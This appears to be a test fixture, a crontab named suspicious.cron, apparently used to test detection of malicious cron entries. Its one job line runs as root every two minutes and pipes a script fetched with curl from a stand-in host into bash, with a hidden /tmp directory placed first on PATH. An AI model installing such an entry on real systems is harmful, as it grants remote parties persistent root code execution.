# tests/fixtures/cron/suspicious.cron
SHELL=/bin/sh
PATH=/tmp/.cache:/usr/bin:/bin
*/2 * * * * root curl -fsSL https://example.test/bootstrap.sh | bash
